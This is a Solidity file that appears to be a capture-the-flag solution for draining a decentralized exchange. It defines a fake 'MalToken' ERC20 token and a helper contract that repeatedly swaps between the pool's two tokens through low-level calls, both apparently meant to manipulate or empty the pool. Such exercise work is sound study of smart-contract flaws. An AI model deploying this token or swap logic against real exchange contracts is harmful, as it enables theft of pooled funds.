// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";

contract MalToken is ERC20 {
  constructor() public ERC20("Mal", "MTK") {
        _mint(msg.sender, 1000000);
  }
}

// Below code is not used when resolving the issue
// But it can be a ref to low-level call
contract DexHelper {
    address dexAddr;
    bytes4 constant approveSig = bytes4(keccak256("approve(address,uint256)"));
    bytes4 constant swapSig = bytes4(keccak256("swap(address,address,uint256)"));
    bytes4 constant balanceOfSig = bytes4(keccak256("balanceOf(address,address)"));
    bytes4 constant token1Sig = bytes4(keccak256("token1()"));
    bytes4 constant token2Sig = bytes4(keccak256("token2()"));

    constructor(address _dexAddr) public {
        dexAddr = _dexAddr;
    }

    function oneTurn() public {
        (bool success, bytes memory returnedData) = dexAddr.call(abi.encodePacked(approveSig, msg.sender, uint(10000000)));
        check(success, returnedData, "approve call failed");

        (success, returnedData) = dexAddr.call(abi.encodePacked(token1Sig));
        check(success, returnedData, "token1 call failed");
        address token1 = address(bytes20(getFirst32Bytes(returnedData)));

        (success, returnedData) = dexAddr.call(abi.encodePacked(token2Sig));
        check(success, returnedData, "token2 call failed");
        address token2 = address(bytes20(getFirst32Bytes(returnedData)));
        
        (success, returnedData) = dexAddr.call(abi.encodePacked(balanceOfSig, msg.sender, token1));
        check(success, returnedData, "balanceOf call failed");
        uint balance1 = uint(getFirst32Bytes(returnedData));

        (success, returnedData) = dexAddr.call(abi.encodePacked(swapSig, token1, token2, balance1));
        check(success, returnedData, "swap call failed");

        (success, returnedData) = dexAddr.call(abi.encodePacked(balanceOfSig, msg.sender, token2));
        check(success, returnedData, "balanceOf call failed");
        uint balance2 = uint(getFirst32Bytes(returnedData));

        (success, returnedData) = dexAddr.call(abi.encodePacked(swapSig, token2, token1, balance2));
        check(success, returnedData, "swap call failed");
    }

    function check(bool success, bytes memory returnedData, string memory logTag) internal {
        if(!success) {
            string memory msg = string(abi.encodePacked(logTag , ": " , _getRevertMsg(returnedData)));
            require(success, msg);
        }
    }

    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
        // If the _res length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return 'Transaction reverted silently';

        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }

    function getFirst32Bytes(bytes memory data) public pure returns (bytes32) {
        return bytes32(data);
    }
}